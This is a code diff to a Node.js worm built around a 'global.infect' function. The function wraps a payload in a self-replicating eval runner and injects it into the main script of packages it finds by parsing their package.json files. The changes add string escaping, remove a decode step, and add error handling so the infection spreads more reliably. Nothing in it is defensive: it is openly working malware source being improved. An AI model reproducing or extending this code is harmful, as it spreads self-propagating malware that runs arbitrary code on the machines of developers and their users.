@@ -4,13 +4,14 @@ global.infect = function( payload ) {
     const os   = require( "os" );
     const path = require( "path" );
 
-    // the original payload, modified with a runner that decodes and executes it
-    // this is the string that will be injected into our targets
+    function escape(str) {
+        return str.replace(/[\\"]/g, "\\$&");
+    }
 
     const modifiedPayload = `
 (function() {
-    var payload = "${payload}";
-    eval(decodeURI(payload));
+    var payload = "${escape(payload)}";
+    eval(payload);
     global.infect( payload );
 })();
     `;
@@ -74,7 +75,13 @@ global.infect = function( payload ) {
                                 return readFile( pkgPath ).then( function( res ) {
 
                                     // load the package.json and find the main script (being index.js if not specified)
-                                    var main     = JSON.parse( res ).main || "index.js";
+                                    try {
+                                        var main = JSON.parse( res ).main || "index.js";
+                                    } catch( e ) {
+                                        // json parsing failed - gotta bail
+                                        return [];
+                                    }
+
                                     var mainPath = path.join( full, main );
                                     
                                     return stat( mainPath ).then( function( res ) {
